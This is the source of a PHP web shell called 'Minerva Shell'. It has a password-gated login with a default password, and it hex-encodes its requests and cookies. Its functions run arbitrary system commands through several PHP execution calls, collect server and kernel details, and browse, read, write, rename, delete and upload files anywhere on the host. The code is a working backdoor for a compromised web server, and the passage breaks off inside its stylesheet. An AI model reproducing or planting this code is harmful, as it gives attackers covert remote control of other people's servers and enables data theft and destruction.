<?php
$rootPath = $_SERVER['DOCUMENT_ROOT'];
$thisPath = $_SERVER['PHP_SELF'];
$MySelf   = dirname($rootPath.$thisPath);
$hex = "6966282177696e646f772e756e657363617065297b77696e646f772e756e657363617065203d2066756e6374696f6e2873297b72657475726e20732e7265706c616365282f25285b302d39412d465d7b327d292f672c2066756e6374696f6e286d2c207029207b72657475726e20537472696e672e66726f6d43686172436f64652827307827202b2070293b7d293b7d3b7d6966282177696e646f772e657363617065297b77696e646f772e657363617065203d2066756e6374696f6e2873297b766172206368722c206865782c2069203d20302c206c203d20732e6c656e6774682c206f7574203d2027273b666f72283b2069203c206c3b2069202b2b297b636872203d20732e6368617241742869293b6966286368722e736561726368282f5b412d5a612d7a302d395c405c2a5c5f5c2b5c2d5c2e5c2f5d2f20293e202d31297b6f7574202b3d206368723b20636f6e74696e75653b207d686578203d20732e63686172436f646541742869292e746f537472696e672820313620293b6f7574202b3d20272527202b20286865782e6c656e6774682025203220213d2030203f20273027203a20272729202b206865783b7d72657475726e206f75743b7d3b7d66756e6374696f6e2062696e326865782873297b73203d20756e65736361706528656e636f6465555249436f6d706f6e656e74287329293b766172206368722c2069203d20302c206c203d20732e6c656e6774682c206f7574203d2027273b666f7228203b2069203c206c3b20692b2b20297b636872203d20732e63686172436f6465417428206920292e746f537472696e672820313620293b6f7574202b3d2028206368722e6c656e67746820252032203d3d20302029203f20636872203a20273027202b206368723b7d72657475726e206f75743b7d3b66756e6374696f6e206865783262696e2873297b72657475726e206465636f6465555249436f6d706f6e656e7428732e7265706c61636528202f2e2e2f672c2027252426272029293b7d3b";

define('ROOT_PATH', $_SERVER['DOCUMENT_ROOT']);
define("FILE_SELF", $_SERVER['PHP_SELF']);
define('HOME', ROOT_PATH.FILE_SELF);

$MINERVA = array(
        "SILENT_MODE" => true,
        "LOGIN_MODE" => true,
        "PASSWORD" => "$2y$10$.26uV0sSlWPsKA0Qra66gOs.07aSbOYaYLuKg/MgJAmB/CIyCHOei", // default(minerva)
        "HOME" => dirname(HOME),
        "HEX" => hex2bin($hex),
);

function displayLogin()
{
        global $MINERVA;
        ?>
        <style type="text/css">
                body {
                        font-family: 'Poppins', sans-serif;
                        margin: 0;
                }

                input, button{
                        font-size: 1rem;
                        border-radius: 1rem;
                        border: none;
                        -webkit-transition: .3s;
                        -o-transition: .3s;
                        transition: .3s;
                }

                input{
                        background: #00000022;
                        padding: .5rem .8rem;
                }

                button{
                        background: #00ffcc;
                        padding: .5rem 1.1rem;
                        cursor: pointer;
                }

                button:hover {
                        background: #00ddaa;
                }

                button:active{
                        -webkit-box-shadow: 0 0 8px #00ddaa;
                        box-shadow: 0 0 8px #00ddaa;
                        -webkit-transition: .1s;
                        -o-transition: .1s;
                        transition: .1s;
                }

                input:focus {
                        background: #00000011;
                }

                input:focus,
                button:focus {
                        outline: none;
                }

                .loginForm{
                        text-align:center;
                        max-width: 350px;
                        margin: 2em auto;
                        padding: .8rem 0 2.2rem 0;
                        -webkit-box-shadow: 0 10px 30px #00000033;
                        box-shadow: 0 10px 30px #00000033;
                        border-radius: .2rem;
                        -webkit-transition: .4s;
                        -o-transition: .4s;
                        transition: .4s;
                        background-color: #ffffff;
                        animation: 1s slideInTop;
                        animation-fill-mode: forwards;
                }

                .loginForm:hover{
                        -webkit-box-shadow: 0 10px 30px #00000048;
                        box-shadow: 0 10px 30px #00000048;
                }

                .overlayBG {
                        background-color: #00000011;
                        position: absolute;
                        height: 100vh;
                        width: 100vw;
                        animation: 1.2s fadeIn;
                        animation-fill-mode: forwards;
                }


                @keyframes fadeIn {
                        0% {
                                opacity: 0;
                        } 100% {
                                opacity: 1;
                        }
                }

                @keyframes slideInTop {
                        0% {
                                margin-top: 0%;
                                opacity: 0;
                        } 100% {
                                margin-top: 7rem;
                                opacity: 1;
                        }
                }

    </style>
    <script type="text/javascript">
        <?php echo $MINERVA['HEX'] ?>

        var loginForm = ''+
                '<div class="overlayBG">'+
                   	 '<div class="loginForm animated bounceInDown">'+
                        	'<div>'+
                        	'<h1>MINERVA SHELL</h1>'+
                    	'</div>'+

                    	'<form method="post">'+
                        	'<input type="password" id="pass" name="password">'+
                        	'<button>Login</button>'+
                    	'</form>'+
                    	'</div>'+
                '</div>';

        document.write(loginForm);
        document.querySelector("#pass").addEventListener("change", function() {
            	varpass = document.querySelector("#pass");
            	pass.value = bin2hex(pass.value);
        });
    </script>
    <?php
}

function activateLoginSystem()
{
        global $MINERVA;
        $password = $MINERVA["PASSWORD"];

        if (!isset($_COOKIE['MINERVA'])) {
                authLogin();
        }

        if (isset($_COOKIE['MINERVA'])) {
                if (getEncodedCookie("MINERVA") !== $password) {
                authLogin();
                }
        }
}

function authLogin()
{
    global $MINERVA;
    $password = $MINERVA["PASSWORD"];
    $inputPassword = hex2bin(post("password"));

    if (isset($inputPassword)) {
        	if (password_verify($inputPassword, $password)) {
            		setEncodedCookie("MINERVA", $password);
        	} else {
            		displayLogin();
            		die();
        	}
    		} else {
        		displayLogin();
        	die();
    	}
}

function post($value)
{
    	return @$_POST[$value];
}

function prints($text)
{
	@ob_end_clean();
	header("Content-Type: text/plain");
	header("Cache-Control: no-cache");
	header("Pragma: no-cache");
	echo bin2hex($text);
	die();
}

function setEncodedCookie($cookieName, $cookieValue)
{
    	$cookieValue = bin2hex($cookieValue);
    	setcookie($cookieName, $cookieValue);
}
function getEncodedCookie($cookieName)
{
    	return hex2bin($_COOKIE[$cookieName]);
}

function cwd()
{
    	$cwd = (function_exists("getcwd")) ? getcwd() : dirname($_SERVER['SCRIPT_FILENAME']);
    	$cwd = str_replace("\\", "/", $cwd);
    	if (!isset($_COOKIE['cwd'])) {
        	setEncodedCookie("cwd", $cwd);
    	} else {
        	$cwds = getEncodedCookie('cwd');
        	if (is_dir($cwds)) {
            		$cwd = realpath($cwds);
        	} else {
            	setEncodedCookie("cwd", $cwd);
        	}
    } return $cwd;
}

function pwd($path)
{
    	$slash = DIRECTORY_SEPARATOR;
    	$path = realpath($path).$slash;
    	$paths = explode($slash, $path);
    	$response = "";

    	for ($i = 0; $i < sizeof($paths)-1 ; $i++) { 
        	$x = "";
        	for ($j=0; $j <= $i ; $j++) { 
            		$x .= $paths[$j].$slash;
        	} $response .= "<span class='pwd' data-path='{$x}'>{$paths[$i]}{$slash}</span>";
    	} return trim($response);
}

function getOS()
{
    	return (strtolower(substr(PHP_OS, 0, 3)) == "win") ? true : false ;
}

function execute($command)
{
    	$output = "";
    	$command = $command. " 2>&1";

    	if (function_exists("System")) {
        	ob_start();
        	@system($command);
        	$output = ob_get_contents();
        	ob_end_clean();
        	if (!empty($output)) {
            		return $output;
        	}
    	} elseif (function_exists("shell_exec")) {
        	$output = @shell_exec($command);
        	if (!empty($output)) {
            		return $output;
        	}
    	} elseif (function_exists("exec")) {
        	@exec($command, $response);
        	if (!empty($response)) {
            	foreach ($response as $lines) {
                	$output = $lines;
            	}
        }
        if (!empty($output)) {
        	return $output;
        }
    	} elseif (function_exists("passthru")) {
        	ob_start();
        	@passthru($command);
        	$output = ob_get_contents();
        	ob_end_clean();
        	if (!empty($output)) {
            		return $output;
        	}
    	} elseif (function_exists("proc_open")) {
        	$desc = array(
            	0 => array("pipe", "r"),
            	1 => array("pipe", "w"),
            	2 => array("pipe", "w")
        );
        $process = @proc_open($command, $desc, $pipes, getcwd(), array());
        if (is_resource($process)) {
            	while ($response = fgets($pipes[1])) {
                	if (!empty($response)) {
                    		$output .= $response;
                	}
            	}
            	while ($response = fgets($pipes[2])) {
               		 if (!empty($response)) {
                    		$output .= $response;
                	}
            	}
        }
        @proc_close($process);
        if (!empty($output)) {
            	return $output;
        }
    	} elseif (function_exists("popen")) {
        	$response = @popen($command, "r");
        	if ($response) {
            	while (!feof($response)) {
                	$output .= fread($response, 2096);
            	}
        } pclose($response);
        if (!empty($output)) {
            	return $output;
        }
    } return "";
}


function libInstalled() {
    $lib[] = "MySQL: ".(function_exists('mysql_connect') ? "<span style='color:#0EF271;'>ON</span>" :  "<span style='color:#FF5252;'>OFF</span>");
    $lib[] = "cURL: ".(function_exists('curl_version') ? "<span style='color:#0EF271;'>ON</span>" : "<span style='color:#FF5252;'>OFF</span>");
    $lib[] = "WGET: ".(exec('wget --help') ? "<span style='color:#0EF271;'>ON</span>" : "<span style='color:#FF5252;'>OFF</span>");
    $lib[] = "Perl: ".(exec('perl --help') ? "<span style='color:#0EF271;'>ON</span>" : "<span style='color:#FF5252;'>OFF</span>");
    $lib[] = "Python: ".(exec('python --help') ? "<span style='color:#0EF271;'>ON</span>" : "<span style='color:#FF5252;'>OFF</span>");
    return implode(" | ", $lib);
}

function getHddSize($size)
{
    switch ($size) {
        case $size >= 1073741824:
            return sprintf('%1.2f',$size / 1073741824 ).' GB';
        break;

        case $size >= 1048576:
            return sprintf('%1.2f',$size / 1048576 ) .' MB';
        break;

        case $size >= 1024:
            return sprintf('%1.2f',$size / 1024 ) .' KB';
        break;
        default:
            return $size .' B';
        break;
    }
}

function hdd()
{
    $hdd['size'] = getHddSize(disk_total_space("/"));
    $hdd['free'] = getHddSize(disk_free_space("/"));
    $hdd['used'] = $hdd['size'] - $hdd['free'];
    return (object) $hdd;
}

function serverInfo()
{
    $disableFunctions = @ini_get('disable_functions');
    $disableFunctions = (!empty($disableFunctions)) ? "<span style='color:#FF5252;'>{$disableFunctions}</span>" : "<span style='color:#0EF271;'>NONE</span>";

    $serverAddr = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : $_SERVER["HTTP_HOST"];
    $serverSoftware = (getenv('SERVER_SOFTWARE') != '') ? getenv('SERVER_SOFTWARE') : '';
    $serverInfo = " <table style='max-width:80%;'>
                    <tr><td>Kernel : ".php_uname()."</td></tr>
                    <tr><td>Server IP : ". $serverAddr ." | Your IP : ". $_SERVER['REMOTE_ADDR']."</td></tr>
                    <tr><td>PHP : ".phpversion()." | {$serverSoftware}</td></tr>
                    <tr><td>Disable Function : {$disableFunctions}</td></tr>
                    <tr><td>HDD : ". @hdd()->used." / ".@hdd()->size." (Free : ".@hdd()->free.")<br></td></tr>
                    <tr><td>".libInstalled()."</td></tr>
                    </table>";
    return $serverInfo;
}

function getActionBtn($type)
{
    $actionButton = array(
        "dot" => "<span class='action upload'></span><span class='action makeFiles'></span>",
        "folder" => "<span class='action rename'></span><span class='action delete'></span>",
        "file" => "<span class='action edit'></span><span class='action rename'></span><span class='action delete'></span>",
        "filter" => "</span><span class='action rename'></span><span class='action delete'></span>"
    );

    switch ($type) {
        case 'dir':
            $btn = $actionButton['folder'];
            break;
        case 'file':
            $btn = $actionButton['file'];
            break;
        case 'dot':
            $btn = $actionButton['dot'];
            break;
        case 'filter':
            $btn = $actionButton['filter'];
            break;
        default:
            break;
    } return $btn;
}

function getDirectoryContents($path, $type)
{
    $result = array();
    foreach (scandir($path) as $value) {

        $file["path"] = str_replace("\\", "/", $path . "/" . $value);
        $ownership = getOwnership($file['path']);

        $file = array(
            $file["path"], // 0 full path
            $value, // 1 single name
            (is_dir($file['path'])) ? @filetype($file['path']) : getFileSize($file['path']), // 2 get size
            fileDate($file['path']), // 3 get file date
            "<span style='color:".getFileColor($file['path']).";'>".getFileMode($file['path'])."</span>",// 4 get permission
            $ownership['user'].":".$ownership['group'], // 5 get ownership
            ($value) == ".." ? getActionBtn("dot") : getActionBtn($type) , // 6 get action button
            is_dir($file["path"]) ? "dir" : "file", // 7 get typefile
            @strtolower(pathinfo($file['path'], PATHINFO_EXTENSION)), // 8 get extension
            getActionBtn("filter"), // 9

        );

        switch ($type) {
            case "dir":
                if (!is_dir($file[0]) || $file[1] === ".") continue 2;
            break;

            case "file":
                if (!is_file($file[0])) continue 2;
            break;
        }

        $result[] = $file;
    }
    return $result;
}

function readFileContents($filename)
{
    if (function_exists('file_get_contents')) {
        return file_get_contents($file);
    } elseif (function_exists('fopen')) {
        $fstream = fopen($file, 'r');
        if (!$fstream) {
            //fclose($fstream);
            return false;
        }
        $content = fread($fstream, filesize($file));
        fclose($fstream);
        return $content;
    }
}

function writeFileContents($filename, $content)
{
    if (!is_writable($filename)) {
        return false;
    }
    if (function_exists('file_put_contents')) {
        return file_put_contents($filename, $content);
    } elseif (function_exists('fopen')) {
        $handle = fopen($filename, 'wb');
        fwrite($handle, $content);
        fclose($handle);
        return true;
    }
    return false;
}

function viewFile($path)
{
    $ownership = getOwnership($path);

    $result = array(
        basename($path), // 0 path
        getFileSize($path), // 1 get size
        fileDate($path), // 2 get file date
        "<span style='color:".getFileColor($path).";'>".getFileMode($path), // 3 get file mode
        $ownership['user'].":".$ownership['group'], // 4 get ownership
        htmlspecialchars(file_get_contents($path)), // 5 read file 
    );

    return $result;
}

function formatBit($size)
{
    $base = log($size) / log(1024);
    $formatBit = array('Byte','KB','MB','GB','TB','PB','EB','ZB','YB');
    return round(pow(1024, $base - floor($base)), 2)." ".$formatBit[floor($base)];
}

function getFileSize($filename)
{
    $size = @filesize($filename);

    if ($size !== false) {
        if ($size <= 0) return 0;
        return formatBit($size);
    } else {
        return "???";
    }
}

function fileDate($file)
{
    return @date("d-m-Y H:i:s", filemtime($file));
}

function getFileColor($file)
{
    if (is_writable($file)) {
        return 'lime';
    } elseif (is_readable($file)) {
        return 'gray';
    } else {
        return 'red';
    }
}

function getFileMode($file)
{
    return substr(sprintf('%o', @fileperms($file)), -4);
}

function getOwnership($filename)
{

    if (!function_exists('stat')) {
        $group = '????';
        $user = '????';
        return compact('user', 'group');
    }
    $stat = @stat($filename);
    if (function_exists('posix_getgrgid')) {
        $group = posix_getgrgid($stat[5])['name'];
    } else {
        $group = $stat[5];
    }
    if (function_exists('posix_getpwuid')) {
        $user = posix_getpwuid($stat[4])['name'];
    } else {
        $user = $stat[4];
    }
    return compact('user', 'group');
}

function deleteAll($filename)
{
    if (is_dir($filename)) {
        foreach (scandir($filename) as $key => $value) {
            if ($value != "." && $value != "..") {
                if (is_dir($filename . DIRECTORY_SEPARATOR . $value)) {
                    deleteAll($filename . DIRECTORY_SEPARATOR . $value);
                } else {
                    @unlink($filename . DIRECTORY_SEPARATOR . $value);
                }
            }
        }
        return @rmdir($filename);
    } else {
        return @unlink($filename);
    }
}

$request = json_decode(file_get_contents('php://input'), true);

if (isset($request)) {
    $_POST['path'] = $request['path'];
    $_POST['action'] = $request['action'];

    if (isset($_POST['path']) && isset($_POST['action'])) {
        $path = hex2bin($_POST['path']);
        $action = hex2bin($_POST['action']);
        switch ($action) {
            case 'chdir':
                if (file_exists($path)) {
                    if (is_dir($path)) {
                        setEncodedCookie("cwd", $path);
                        $response = json_encode([
                            "path" => dirname($path), 
                            "dirname" => getDirectoryContents($path, "dir"),
                            "filename" => getDirectoryContents($path, "file"),
                            "dot" => getDirectoryContents($path, "dot"),
                            "pwd" => pwd($path)
                        ]);
                    } prints($response);
                }
            break;
            case 'viewFile':
                if (file_exists($path)) {
                    if (is_file($path)) {
                        $response = json_encode([
                            "path" => $path,
                            "viewFile" => viewFile($path),
                            "pwd" => pwd(dirname($path))
                        ]);
                    } prints($response);
                }
                break;
            case 'writeFile':
                $filename = $path;
                $content = hex2bin($request['content']);
                $time = hex2bin($request['time']);
                if (file_exists($path)) {
                    if (is_file($path)) {
                        if (writeFileContents($filename, $content)) {
                            @touch($filename, @strtotime($time));
                            $response = json_encode([
                                "path" => $path,
                                "status" => "success",
                                "pwd" => pwd($path)
                            ]);
                        } else {
                            $response = json_encode([
                                "status" => "failed",
                            ]);
                        }
                    }
                } prints($response);
                break;
            case 'renameFiles':
                $oldname = $path;
                $newname = hex2bin($request['newname']);
                if (file_exists($oldname)) {
                    if (rename($oldname, dirname($oldname)."/".$newname)) {
                        $response = json_encode([
                            "path" => dirname($oldname),
                            "newname" => dirname($oldname)."/".$newname,
                            "status" => "success",
                            "pwd" => pwd($path)
                        ]);
                    } else {
                        $response = json_encode([
                            "status" => "failed",
                        ]);
                    }
                } prints($response);
                break;

            case 'deleteFiles':
                if (file_exists($path)) {
                    if (deleteAll($path)) {
                        $response = json_encode([
                            "path" => dirname($path),
                            "fileDeleted" => basename($path),
                            "status" => "success",
                        ]);
                    } else {
                        $response = json_encode([
                            "status" => "failed",
                        ]);
                    }
                } prints($response);
                break;

            case 'logout':
                if (isset($_COOKIE['MINERVA'])) {
                    setcookie("MINERVA", null);
                    $response = json_encode([
                        "logout" => setcookie("MINERVA", "")
                    ]);
                }
                prints($response);
                break;

            default:
            break;
        }
    }
} else {
    $tabsContent = "";
    if (isset($_POST['view'])) {
    } else {
        $tabsContent = bin2hex(str_replace("\\", "/", cwd()));
    }

    if (isset($_POST['path'])) {
        $_POST['path'] = hex2bin($_POST['path']);
        $_POST['action'] = hex2bin($_POST['action']);
        $_POST['destination'] = hex2bin($_POST['destination']);

        switch ($_POST['action']) {
            case 'uploadFile':
            if ($_FILES['files']['name'] == 0) {
                $response = json_encode([
                    "status" => $_FILES['files']["error"]
                ]);
                exit(prints($response));
            }
            for ($i=0; $i < count($_FILES['files']['name']) ; $i++) {
                if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $_POST['destination']."/".$_FILES['files']['name'][$i])) {
                    $response = json_encode([
                        "path" => $_POST['destination'],
                        "fileUploaded" => count(array_filter($_FILES['files']['name'])),
                        "status" => "success",
                    ]);
                } else {
                    $response = json_encode([
                        "status" => "failed"
                    ]);
                }
            } prints($response);
            exit();
            break;

            default:
            break;
        }
    }
}

if ($MINERVA["LOGIN_MODE"]) {
    activateLoginSystem();
}

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Minerva</title>
</head>
<style type="text/css">
    @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&display=swap');
    body {
        background-color: #1D1E22;
        margin: 0;
    }
    * {
        font-family: 'Open Sans', sans-serif;
    }

    span.cd {
        cursor: pointer;
    }
    .icon_previous {
        vertical-align: middle;
        width: 25px;
        height: 25px;
        margin-right: 10px;
        content: url('data:image/png;base64,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');
    }

    .icon_folder {
        vertical-align: middle;
        width: 25px;
        height: 25px;
        margin-right: 10px;
        content: url('https://www.iconpacks.net/icons/2/free-folder-icon-1485-thumb.png');
    }

    .icon_file {
        vertical-align: middle;
        width: 25px;
        height: 25px;
        margin-right: 10px;
        content: url('https://icon-library.com/images/png-file-icon/png-file-icon-6.jpg');
    }

    span.pwd {
        cursor: pointer;
    }

    span.action {
        background-color: red;
        padding: 7px;
        margin: 2px;
        padding-right:10px;
        padding-left: 10px;
        border-radius: 5px;
        cursor: pointer;
    }
    span.action.upload::before {
        content: "U";
    }

    span.action.upload {
        background-color: #0BDB65;
    }

    span.action.makeFiles::before {
        content: "M";
    }

    span.action.makeFiles {
        background-color: #BF8BFF;
    }

    span.action.rename::before {
        content: "R";
    }

    span.action.rename {
        background-color: #0583D2;
    }

    span.action.edit::before {
        content: "E";
    }

    span.action.edit {
        background-color: #61B0B7;
    }

    span.action.delete::before {
        content: "X";
    }

    span.action.delete {
        background-color: #FF5252;
    }

    textarea {
        background-color: #1D1E22;
        padding: 20px;
        color: #fff;
        width: 97%;
        resize: none;
        outline: none;
        border: none;
        border-radius: 10px;
        height: 240px;
    }

    input.input {
        width: 50%;
        outline: none;
        background: #1D1E22;
        color: #fff;
        border-radius: 4px;
        border: 1px solid #009879;

    }

    input[type=file] {
        color: #fff;
        width: 67.5%;
        background: #1D1E22;
        padding: 7px;
        margin-top: 10px;
        border-radius: 5px;
        border: 1px solid #009879;
        margin-right: 10px;
    }

    .uploadSubmit {
        background: #1D1E22;
        color: #fff;
        border: 1px solid #009879;
        border-radius: 5px;
        padding: 8px;
        font-weight: bold;
    }

    .uploadSubmit:hover {
        border: 1px solid #009879;
        background: #1D1E22;
        cursor: pointer;
    }

    span.renameAction {
        display: inline-block;
        box-sizing: border-box;
        border: 1px solid;
        border-radius: .3rem;
        border-color: #6EB876;
        color: #6EB876;
        margin-left: 3px;
        margin-right: 3px;
        text-decoration: none;
        padding: .1rem 1.3rem;
    }

    span.renameAction:hover {
        color: white;
        cursor: pointer;
        background-color: #6EB876; 
    }

    span.cancel {
        display: inline-block;
        box-sizing: border-box;
        border: 1px solid;
        border-radius: .3rem;
        border-color: #CB4133;
        color: #CB4133;
        margin-left: 3px;
        margin-right: 3px;
        text-decoration: none;
        padding: .1rem 1.3rem;
    }

    span.cancel:hover {
        color: white;
        cursor: pointer;
        background-color: #CB4133;
    }

    .serverInfo {
        color: #fff;
        padding: 10px;
        padding-left:30px;
    }

    #navbar {
        background-color: #1D1E22;
        color: rgb(13, 26, 38);
        position: fixed;
        top: 0;
        height: 60px;
        line-height: 60px;
        width: 100vw;
        border-bottom-left-radius: 7px;
        border-bottom-right-radius: 7px;
        z-index: 10;
    }

    .nav-wrapper {
        margin: auto;
        text-align: center;
        width: 70%;
    }


    .logo {
        float: left;
        margin-left: -200px;
        font-size: 1.5em;
        height: 60px;
        letter-spacing: 1px;
        text-transform: uppercase;
    }

    .logo a {
        text-decoration: none;
        color: #fff;
    }

    div.alert {
        background-color: #33AB5F;
        padding: 10px;
        color: #fff;
        text-align: left;
        border-radius: 10px;
        text-shadow: #088F44;
    }

    div.alert span.msg {
        font-size: 18px;
        font-weight: bold;
        padding-right: 12px;
        padding-left: 12px;
    }

    div.alert span.close {
        float: right;
        font-size: 18px;
        font-weight: bold;
        padding-right: 12px;
    }

    #navbar ul {
        display: inline-block;
        float: right;
        list-style: none;
        margin-top: -2px;
        margin-right: -150px;
        text-align: right;
        transition: transform 0.5s ease-out;
        -webkit-transition: transform 0.5s ease-out;
    }

    #navbar li {
        display: inline-block;
    }

    #navbar li a {
        color: rgb(13, 26, 38);
        display: block;
        font-size: 0.7em;
        height: 50px;
        letter-spacing: 1px;
        margin: 0 20px;
        padding: 0 4px;
        position: relative;
        text-decoration: none;
        color: #fff;
        text-transform: uppercase;
        transition: all 0.5s ease;
        -webkit-transition: all 0.5s ease;
    }

    #navbar li a.logout {
        color: #FF5252;
    }

    #navbar li a:hover {
        color: rgb(28, 121, 184);
        transition: all 1s ease;
        -webkit-transition: all 1s ease;
    }

    #navbar li a:before, #navbar li a:after {
        content: '';
        position: absolute;
        width: 0%;
        height: 1px;
        bottom: -1px;
        background: rgb(13, 26, 38);
    }

    #navbar li a:before {
        left: 0;
        transition: 0.5s;
    }

    #navbar li a:after {
        background: rgb(13, 26, 38);
        right: 0;
    }

    #navbar li a:hover:before {
        background: rgb(13, 26, 38);
        width: 100%;
        transition: width 0.5s cubic-bezier((0.22, 0.61, 0.36, 1));
    }

    #navbar li a:hover:after {
        background: transparent;
        width: 100%;
    }

    .content-table {
        color: #fff;
        border-collapse: collapse;
        margin: 25px 0;
        font-size: 0.8em;
        border-radius: 7px;
        overflow-y: hidden;
        overflow-x: hidden;
        box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
    }

    .content-table thead tr {
        background-color: #1D1E22;
        color: #ffffff;
        text-align: left;
        font-weight: bold;
    }

    .content-table th {
        padding: 16px;
        text-align: center;
    }

    .content-table td {
        padding: 7px 15px;
    }

    .content-table td:nth-child(2),
    .content-table td:nth-child(3),
    .content-table td:nth-child(4),
    .content-table td:nth-child(5),
    .content-table td:nth-child(6) {
        text-align: center;
    }

    .content-table td:nth-child(2) {
        width:60px;
    }

    .content-table td:nth-child(3) {
        width:120px;
    }

    .content-table td:nth-child(4) {
        width: 40px;
    }

    .content-table td:first-child {
        width: 650px;
    }

    .content-table tbody tr {
        border-bottom: 1px solid #1D1E22;
        background-color: #202124;
    }

    .content-table tbody tr:last-of-type {
        border-bottom: 2px solid #009879;
    }

    .content-table tbody tr.hover:hover {
            background-color: #3C3C3C;
    }

    .content-table tbody tr.active-row:hover {
        font-weight: bold;
        color: #009879;
    }

    #link {color: #E45635;display:block;font: 12px "Helvetica Neue", Helvetica, Arial, sans-serif;text-align:center; text-decoration: none;}
    #link:hover {color: #CCCCCC}

    #link, #link:hover {-webkit-transition: color 0.5s ease-out;-moz-transition: color 0.5s ease-out;-ms-transition: color 0.5s ease-out;-o-transition: color 0.5s ease-out;transition: color 0.5s ease-out;}

        @keyframes rotate-loading {
            0%  {transform: rotate(0deg);-ms-transform: rotate(0deg); -webkit-transform: rotate(0deg); -o-transform: rotate(0deg); -moz-transform: rotate(0deg);}
            100% {transform: rotate(360deg);-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg);}
        }

        @-moz-keyframes rotate-loading {
            0%  {transform: rotate(0deg);-ms-transform: rotate(0deg); -webkit-transform: rotate(0deg); -o-transform: rotate(0deg); -moz-transform: rotate(0deg);}
            100% {transform: rotate(360deg);-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg);}
        }

        @-webkit-keyframes rotate-loading {
            0%  {transform: rotate(0deg);-ms-transform: rotate(0deg); -webkit-transform: rotate(0deg); -o-transform: rotate(0deg); -moz-transform: rotate(0deg);}
            100% {transform: rotate(360deg);-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg);}
        }

        @-o-keyframes rotate-loading {
            0%  {transform: rotate(0deg);-ms-transform: rotate(0deg); -webkit-transform: rotate(0deg); -o-transform: rotate(0deg); -moz-transform: rotate(0deg);}
            100% {transform: rotate(360deg);-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg);}
        }

        @keyframes rotate-loading {
            0%  {transform: rotate(0deg);-ms-transform: rotate(0deg); -webkit-transform: rotate(0deg); -o-transform: rotate(0deg); -moz-transform: rotate(0deg);}
            100% {transform: rotate(360deg);-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg);}
        }

        @-moz-keyframes rotate-loading {
